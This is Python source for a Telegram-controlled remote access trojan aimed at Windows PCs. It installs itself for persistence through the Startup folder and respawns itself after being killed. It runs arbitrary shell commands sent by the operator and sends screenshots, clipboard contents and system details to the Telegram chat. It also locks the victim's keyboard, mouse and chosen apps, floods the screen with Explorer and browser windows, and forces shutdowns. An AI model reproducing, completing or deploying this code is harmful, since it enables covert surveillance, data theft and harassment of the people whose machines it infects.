import telebot
import os
import getpass
import platform
import subprocess
import socket
import psutil
from telebot import types
from PIL import ImageGrab
import random
import shutil
import webbrowser
import ctypes
import sys
import pyautogui
import time, threading
import keyboard as kb
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
import pygame
import pyperclip

username = getpass.getuser()

keys = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    'enter', 'esc', 'space', 'tab', 'backspace', 'delete', 'insert',
    'home', 'end', 'page up', 'page down', 'left', 'up', 'right', 'down',
    'caps lock', 'num lock', 'scroll lock',
    'shift', 'ctrl', 'alt', 'alt gr', 'win', 'menu', 'print screen', 
    'pause', 'break',
    'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
    'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f20', 'f21', 'f22', 'f23', 'f24',
    'numpad 0', 'numpad 1', 'numpad 2', 'numpad 3', 'numpad 4', 'numpad 5',
    'numpad 6', 'numpad 7', 'numpad 8', 'numpad 9', 'numpad add', 'numpad subtract',
    'numpad multiply', 'numpad divide', 'numpad decimal', 'numpad enter',
    'numpad equal',
    'semicolon', 'equal', 'comma', 'minus', 'period', 'slash', 'grave',
    'left bracket', 'backslash', 'right bracket', 'quote',
    'minus', 'equal', 'left bracket', 'right bracket', 'backslash',
    'semicolon', 'quote', 'comma', 'period', 'slash',
    'grave', 'backtick', 'tilde'
]

bot_token = 'your bot token from -> @BotFather'
bot = telebot.TeleBot(bot_token)

cmd_spam_processes = []

def restart_on_exit():
    parent_pid = os.getpid() 
    monitor_thread = threading.Thread(target=monitor_process, args=(parent_pid,))
    monitor_thread.daemon = True
    monitor_thread.start()

def monitor_process(parent_pid):
    while True:
        if not psutil.pid_exists(parent_pid): 
            python = sys.executable  
            os.execl(python, python, *sys.argv)  
        time.sleep(1)

def add_to_startup_for_device():
    if getattr(sys, 'frozen', False):
        file_path = sys.executable
    else:
        file_path = os.path.abspath(__file__)

    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    try:
        shutil.copy(file_path, startup_folder)
    except Exception as e:
        pass

def create_keyboard():
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    keyboard.add(
        types.KeyboardButton("/explorer_spam"),
        types.KeyboardButton("/stop_explorer_spam"),
        types.KeyboardButton("/open_url url"),
        types.KeyboardButton("/stop_url"),
        types.KeyboardButton("/mouse x y"),
        types.KeyboardButton("/mouse_spam"),
        types.KeyboardButton("/mouse_spam_stop"),
        types.KeyboardButton("/keyboard word/letter"),
        types.KeyboardButton("/keyboard_spam word/letter"),
        types.KeyboardButton("/keyboard_spam_stop"),
        types.KeyboardButton("/block_app app.exe"),
        types.KeyboardButton("/stop_blocking_app"),
        types.KeyboardButton("/block_hotkeys hotkey1;hotkey2"),
        types.KeyboardButton("/unblock_hotkeys"),
        types.KeyboardButton("/block_keys_kb a;b;c"),
        types.KeyboardButton("/unblock_keys_kb"),
        types.KeyboardButton("/block_all_keys"),
        types.KeyboardButton("/unblock_all_keys"),
        types.KeyboardButton("/mouse_block"),
        types.KeyboardButton("/mouse_block_stop"),
        types.KeyboardButton("/sound"),
        types.KeyboardButton("/cmd command"),
        types.KeyboardButton("/screen"),
        types.KeyboardButton("/photo"),
        types.KeyboardButton("/buffer"),
        types.KeyboardButton("/info"),
        types.KeyboardButton("/shutdown"),
    )
    return keyboard
    
@bot.message_handler(commands=['buffer'])
def unblock_keys(message):
    args = message.text.split(' ')
    if len(args) < 1:
        bot.send_message(message.chat.id, "Usage: /buffer", reply_markup=create_keyboard())
        return
    
    clipboard_content = pyperclip.paste()
    if clipboard_content:
        bot.send_message(message.chat.id, clipboard_content, reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "buffer is empty", reply_markup=create_keyboard())

blocking_thread = None
blocking_active = False
keys_to_block = []
hotkeys_to_block = []

@bot.message_handler(commands=['block_hotkeys'])
def block_keys(message):
    global blocking_active, hotkeys_to_block

    args = message.text.split(' ', 1)
    if len(args) < 2:
        bot.send_message(message.chat.id, "Usage: /block_hotkeys hotkey1;hotkey2", reply_markup=create_keyboard())
        return

    if blocking_active:
        bot.send_message(message.chat.id, "Hotkeys are already blocked", reply_markup=create_keyboard())
        return

    hotkeys_to_block = args[1].split(';')
    blocking_active = True

    def block_hotkeys_thread():
        try:
            for hotkey in hotkeys_to_block:
                kb.add_hotkey(hotkey, lambda: None, suppress=True)
            bot.send_message(message.chat.id, f"Hotkeys are locked:: {', '.join(hotkeys_to_block)}. Use /unblock_keys to unblock it", reply_markup=create_keyboard())
            while blocking_active:
                time.sleep(1)
        except Exception as e:
            bot.send_message(message.chat.id, f"Error when locking hotkeys: {e}", reply_markup=create_keyboard())

    threading.Thread(target=block_hotkeys_thread, daemon=True).start()

@bot.message_handler(commands=['unblock_hotkeys'])
def unblock_keys(message):
    global blocking_active, hotkeys_to_block

    if not blocking_active:
        bot.send_message(message.chat.id, "Hotkeys are already unlocked", reply_markup=create_keyboard())
        return

    blocking_active = False
    kb.clear_all_hotkeys() 
    hotkeys_to_block = []
    bot.send_message(message.chat.id, "Hotkeys are unlocked", reply_markup=create_keyboard())

@bot.message_handler(commands=['block_keys_kb'])
def block_keys_kb(message):
    global blocking_thread, blocking_active, keys_to_block

    args = message.text.split(' ', 1)
    if len(args) < 2:
        bot.send_message(message.chat.id, "Usage: /block_keys_kb a;b;c", reply_markup=create_keyboard())
        return
    if blocking_active:
        bot.send_message(message.chat.id, "The keys are already locked", reply_markup=create_keyboard())
        return

    keys_to_block = args[1].split(';')
    blocking_active = True

    def block_selected_keys():
        try:
            for key in keys_to_block:
                kb.block_key(key)
            bot.send_message(message.chat.id, f"Key lock: {', '.join(keys_to_block)}. Use /unblock_keys_kb to unblock it", reply_markup=create_keyboard())
            while blocking_active:
                time.sleep(1)
        except Exception as e:
            bot.send_message(message.chat.id, f"Key lock error: {e}", reply_markup=create_keyboard())

    blocking_thread = threading.Thread(target=block_selected_keys, daemon=True)
    blocking_thread.start()

@bot.message_handler(commands=['unblock_keys_kb'])
def unblock_keys(message):
    global blocking_active, keys_to_block

    if not blocking_active:
        bot.send_message(message.chat.id, "The keys are already unlocked", reply_markup=create_keyboard())
        return

    blocking_active = False
    for key in keys_to_block:
        kb.unblock_key(key)
    keys_to_block = [] 
    bot.send_message(message.chat.id, "Keys unlocked", reply_markup=create_keyboard())

@bot.message_handler(commands=['block_all_keys'])
def block_all_keys(message):
    global blocking_active, keys

    args = message.text.split(' ', 1)
    if len(args) < 1:
        bot.send_message(message.chat.id, "Usage: /block_all_keys", reply_markup=create_keyboard())
        return
    if blocking_active:
        bot.send_message(message.chat.id, "The keys are already locked", reply_markup=create_keyboard())
        return
    
    blocking_active = True

    def block_all_keys():
        try:
            for key in keys:
                kb.block_key(key)
            bot.send_message(message.chat.id, f"All keys are blocked. Use /unblock_keys to unblock it", reply_markup=create_keyboard())
            while blocking_active:
                time.sleep(1)
        except Exception as e:
            bot.send_message(message.chat.id, f"Key lock error: {e}", reply_markup=create_keyboard())

    blocking_thread = threading.Thread(target=block_all_keys, daemon=True)
    blocking_thread.start()

@bot.message_handler(commands=['unblock_all_keys'])
def unblock_keys(message):
    global blocking_active, keys

    if not blocking_active:
        bot.send_message(message.chat.id, "keys are already unlocked", reply_markup=create_keyboard())
        return

    blocking_active = False
    try:
        for key in keys:
            kb.unblock_key(key)
    except:
        pass
    bot.send_message(message.chat.id, "Keys unlocked", reply_markup=create_keyboard())

blocked_apps = set()

@bot.message_handler(commands=['block_app'])
def block_task_manager(message):
    global start_app_block
    try:
        args = message.text.split(' ')
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /block_app app_name.exe", reply_markup=create_keyboard())
            return
        
        app_name = args[1]
        
        if app_name in blocked_apps:
            bot.send_message(message.chat.id, f"{app_name} is already blocked", reply_markup=create_keyboard())
            return
        
        start_app_block = True
        threading.Thread(target=block_keys, args=(app_name,), daemon=True).start()
        blocked_apps.add(app_name)
        bot.send_message(message.chat.id, f"{app_name} is blocked now", reply_markup=create_keyboard())
    
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())


@bot.message_handler(commands=['stop_blocking_app'])
def unblock_task_manager(message):
    global start_app_block
    try:
        start_app_block = False
        blocked_apps.clear()
        bot.send_message(message.chat.id, "All apps are unblocked now", reply_markup=create_keyboard())
    
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

mouse_block = True

def keep_cursor_centered():
    global mouse_block
    screen_width, screen_height = pyautogui.size()
    center_x, center_y = screen_width // 2, screen_height // 2
    
    try:
        while not mouse_block:
            pyautogui.moveTo(center_x, center_y, duration=0.1)
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass

@bot.message_handler(commands=['mouse_block'])
def block_mouse(message):
    global mouse_block
    try:
        if not mouse_block:
            bot.send_message(message.chat.id, "the mouse is already locked", reply_markup=create_keyboard())
            return
        
        mouse_block = False
        threading.Thread(target=keep_cursor_centered, daemon=True).start()
        bot.send_message(message.chat.id, f"mouse_block executed to all", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['mouse_block_stop'])
def move_mousik(message):
    global mouse_block
    try:
        if mouse_block:
            bot.send_message(message.chat.id, "the mouse is already unlocked", reply_markup=create_keyboard())
            return

        mouse_block = True
        bot.send_message(message.chat.id, f"mouse_block_stop executed on all", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['mouse'])
def move_mousik(message):
    try:
        args = message.text.split(' ')
        if len(args) < 3:
            bot.send_message(message.chat.id, "Usage: /mouse x y", reply_markup=create_keyboard())
            return

        x = int(args[1])
        y = int(args[2])

        pyautogui.moveTo(x, y)
        bot.send_message(message.chat.id, f"mouse executed to all", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

def set_volume():
    try:
        CoInitialize()

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)

        volume.SetMasterVolumeLevelScalar(1.0, None)

    finally:
        CoUninitialize()

@bot.message_handler(commands=['sound'])
def play_sound(message):
    try:
        set_volume()
        pygame.init()
        song = pygame.mixer.Sound(rf'C:\Users\{username}\AppData\Local\Roblox\Musics\ass.mp3')
        song.play()
        time.sleep(song.get_length())
        pygame.quit()
        bot.send_message(message.chat.id, "Sound played successfully", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

mouse_spam = True

def mouse_movik():
    global mouse_spam
    while not mouse_spam:
        x = random.randint(0, 1920)
        y = random.randint(0, 1080)
        pyautogui.moveTo(x, y)

@bot.message_handler(commands=['mouse_spam'])
def move_mousik(message):
    global mouse_spam
    try:
        if not mouse_spam:
            bot.send_message(message.chat.id, "mouse_spam is already running", reply_markup=create_keyboard())
            return

        mouse_spam = False
        threading.Thread(target=mouse_movik, daemon=True).start()
        bot.send_message(message.chat.id, f"mouse_spam executed to all", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['mouse_spam_stop'])
def move_mousik(message):
    global mouse_spam
    try:
        if mouse_spam:
            bot.send_message(message.chat.id, "mouse_spam is already stopped", reply_markup=create_keyboard())
            return

        mouse_spam = True
        bot.send_message(message.chat.id, f"mouse_spam_stop executed on all", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

keyboard_start = False
letter = False

def Keyboardik(klavishi, lett):
    global keyboard_start
    while not keyboard_start:
        if lett:
            kb.press(klavishi)
        else:
            kb.write(klavishi, delay=0.1)

@bot.message_handler(commands=['keyboard'])
def move_mousik(message):
    try:
        args = message.text.split(' ')
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /keyboard word/letter", reply_markup=create_keyboard())
            return

        klavisha = args[1]

        if len(klavisha) > 1:
            letter = False
        else:
            letter = True

        if letter == True:
            kb.press(klavisha)
        else:
            kb.write(klavisha, delay=0.1)
        bot.send_message(message.chat.id, f"keyboard executed on all", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['keyboard_spam'])
def move_mousik(message):
    global keyboard_start
    try:
        args = message.text.split(' ')
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /keyboard_spam word/letter", reply_markup=create_keyboard())
            return
        if not keyboard_start:
            bot.send_message(message.chat.id, "Keyboard_spam is already running", reply_markup=create_keyboard())
            return

        klavisha = args[1]

        if len(klavisha) > 1:
            letter = False
        else:
            letter = True

        keyboard_start = False
        threading.Thread(target=Keyboardik, args=(klavisha, letter,), daemon=True).start()
        bot.send_message(message.chat.id, f"keyboard_spam executed on all", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['keyboard_spam_stop'])
def move_mousik(message):
    global keyboard_start
    try:
        if keyboard_start:
            bot.send_message(message.chat.id, "Keyboard_spam is already stopped", reply_markup=create_keyboard())
            return

        keyboard_start = True
        bot.send_message(message.chat.id, f"keyboard_spam was stopped to all", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

def set_wallpaper(file_id):
    file_info = bot.get_file(file_id)
    if not file_info or not file_info.file_path:
        raise Exception("Failed to get file path")
    
    downloaded_file = bot.download_file(file_info.file_path)
    save_dir = 'documents'
    if not os.path.exists(save_dir):
        os.makedirs(save_dir)
    
    save_path = os.path.join(save_dir, os.path.basename(file_info.file_path))
    with open(save_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    ctypes.windll.user32.SystemParametersInfoA(20, 0, save_path.encode('utf-8'), 3)

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        file_id = message.photo[-1].file_id
        set_wallpaper(file_id)
        bot.reply_to(message, f"The wallpaper has been successfully saved", reply_markup=create_keyboard())
    except Exception as e:
        bot.reply_to(message, f"There was an error when receiving the photo: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['cmd'])
def run_command(message):
    try:
        args = message.text.split(' ', 2)
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /cmd command", reply_markup=create_keyboard())
            return

        command = message.text[len('/cmd '):].strip()
        
        if not command:
            bot.send_message(message.chat.id, "Usage: /cmd command", reply_markup=create_keyboard())
            return

        subprocess.Popen(command, shell=True)
        bot.send_message(message.chat.id, f"Broadcast command executed with command: {command}", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['screen'])
def take_screenshot(message):
    try:
        screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{1}.jpg')
        ImageGrab.grab().save(screen_path)
        with open(screen_path, 'rb') as screen:
            bot.send_photo(message.chat.id, screen)
        os.remove(screen_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

def get_local_ip():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip

@bot.message_handler(commands=['info'])
def get_system_info(message):
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /info", reply_markup=create_keyboard())
            return

        os_info = platform.platform()
        processor = platform.processor()
        ip = get_local_ip()
        bot.send_message(
            message.chat.id,
            f"System Info:\n"
            f"Username: {username}\n"
            f"OS: {os_info}\n"
            f"Processor: {processor}\n"
            f"IP: {ip}", reply_markup=create_keyboard()
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['shutdown'])
def shutdown_device(message):
    try:
        os.system('shutdown /s /f /t 0')
        bot.send_message(message.chat.id, f"Shutdown command executed", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

spam_running = False

def open_explorer():
    global spam_running
    spam_running = True
    while spam_running:
        subprocess.Popen(['explorer'])
        time.sleep(1)

def kill_explorer():
    global spam_running
    spam_running = False
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == 'explorer.exe':
            proc.kill()

@bot.message_handler(commands=['explorer_spam'])
def explorer_spam(message):
    try:
        threading.Thread(target=open_explorer, daemon=True).start()
        bot.send_message(message.chat.id, f"Explorer spam executed", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['stop_explorer_spam'])
def stop_explorer_spam(message):
    try:
        kill_explorer()
        bot.send_message(message.chat.id, f"Stopped Explorer spam", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

open_url = False

def open_links(url):
    global open_url
    while not open_url:
        webbrowser.open(url, new=2)
        time.sleep(1)

@bot.message_handler(commands=['open_url'])
def open_url(message):
    global open_url
    try:
        args = message.text.split(' ', 2)
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /open_url url", reply_markup=create_keyboard())
            return

        url = args[1]

        if not (url.startswith("http://") or url.startswith("https://")):
            url = "https://" + url

        open_url = False
        threading.Thread(target=open_links, args=(url,), daemon=True).start()
        bot.send_message(message.chat.id, f"URL opened: {url}", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(commands=['stop_url'])
def open_url(message):
    global open_url
    try:
        args = message.text.split(' ', 2)
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /stop_url", reply_markup=create_keyboard())
            return
        
        open_url = True
        bot.send_message(message.chat.id, f"URL stopped", reply_markup=create_keyboard())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.send_message(
        message.chat.id,
        "Unknown command. Use the menu to select",
        reply_markup=create_keyboard()
    )

if __name__ == '__main__':
    restart_on_exit()

    add_to_startup_for_device()
    bot.polling()